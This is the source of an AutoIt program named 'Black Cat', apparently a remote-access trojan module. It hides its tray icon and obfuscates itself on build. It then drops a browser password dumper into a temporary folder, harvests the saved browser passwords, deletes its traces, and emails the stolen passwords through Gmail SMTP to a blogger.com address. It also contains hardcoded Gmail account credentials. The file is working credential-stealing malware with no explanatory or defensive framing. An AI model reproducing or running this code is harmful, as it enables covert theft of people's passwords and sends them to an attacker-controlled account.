#NoTrayIcon
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Icon=Resource\Icon.ico
#AutoIt3Wrapper_Outfile=Release\Black Cat.exe
#AutoIt3Wrapper_UseUpx=n
#AutoIt3Wrapper_Res_Description=Black Cat
#AutoIt3Wrapper_Res_Fileversion=1.0.0.0
#AutoIt3Wrapper_Res_LegalCopyright=Copyright © 2013 Black Cat
#AutoIt3Wrapper_Res_Language=1033
#AutoIt3Wrapper_Run_Obfuscator=y
#Obfuscator_Parameters=/sf=1 /sv=1
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#include <File.au3>
#include <Process.au3>
#include "Include\RemoteGmail.au3"

Global Const $sAppPath = _TempFile("", "", "", 8)
Global $aPassword, $sPassword = ""

RemoteGmail_Startup("bcatrat78", "tomcat2013")

DirCreate($sAppPath)
FileInstall("bin\BrowserPasswordDump.exe", $sAppPath & "\BrowserPasswordDump.exe", 1)
_RunDos($sAppPath & "\BrowserPasswordDump.exe > " & $sAppPath & "\Password.txt")
_FileReadToArray($sAppPath & "\Password.txt", $aPassword)
For $i = 13 To $aPassword[0]
	If $aPassword[$i] <> "" Then $sPassword &= $aPassword[$i] & @CRLF
Next
DirRemove($sAppPath, 1)

_Post("post13", $sPassword, "", 0, "Browser Password")
If @error Then Exit

Func _Post($secretWords, $Body, $AttachFiles = '', $nZip = False, $nSubject = 'Report')
	If Not ($AttachFiles = '') And $nZip = True Then $AttachFiles = Zipit($AttachFiles, $Body)
	_INetSmtpMailCom("smtp.gmail.com", $__rg__sUsername, $__rg__sEmail, $__rg__sUsername & "." & $secretWords & "@blogger.com", $nSubject & " - Black Cat", _
			$Body, $AttachFiles, '', '', "Normal", $__rg__sUsername, $__rg__sPassword, 465, 1)
	If @error Then Return SetError(1, @error, -1)
	If $nZip Then FileDelete($AttachFiles)
	If @error Then Return SetError(2, @error, -1)
	Return 1
EndFunc   ;==>_Post
